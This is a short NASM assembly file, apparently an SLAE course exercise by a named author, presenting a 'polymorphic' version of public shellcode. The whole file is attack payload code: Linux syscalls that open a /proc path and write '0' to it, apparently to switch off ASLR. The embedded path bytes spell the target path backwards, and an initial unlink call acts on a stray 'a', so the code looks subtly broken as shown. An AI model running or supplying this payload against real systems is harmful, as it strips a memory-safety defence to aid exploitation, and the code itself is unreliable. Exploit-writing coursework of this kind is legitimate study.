; Filename: poly-617.nasm
; Author: Konstantinos Alexiou
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
; Desc: Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-617.php 
; Purpose: SLAE

global _start

section .text
_start:
	 ; int unlink(const char *pathname);
	 push byte +0x61
	 sub bl,bl
	 mov ebx,esp
	 mov al,0xa
	 int 0x80
	 
	 ; int open(const char *pathname, int flags, mode_t mode)	
         sub ebx,ebx
	 jmp aslr_path

open_syscall:
	 pop ebx
	 sub cx,cx
	 mul ecx
	 mov cx,0x441
	 mov dx,0x1a4
	 sub eax,eax
	 mov al,0x5
	 int 0x80
	 
	 ; ssize_t write(int fd, const void *buf, size_t count)
         xchg ebx,eax
	 sub cx,cx
	 mul cx
	 push word 0xa30
	 mov ecx,esp
	 mov dl,0x2
	 sub eax,eax
	 mov al,0x4
	 int 0x80
	 
	 ;exit 	 
	 xor al,0x3
	 int 0x80
	
	aslr_path:
	call open_syscall
	db 0x63,0x61,0x70,0x73,0x5f,0x61,0x76,0x5f,0x65,0x7a,0x69,0x6d,0x6f,0x64,0x6e,0x61,0x72,0x2f,0x6c,0x65,0x6e,0x72,0x65,0x6b,0x2f,0x73,0x79,0x73,0x2f,0x63,0x6f,0x72,0x70,0x2f,0x2f,0x2f

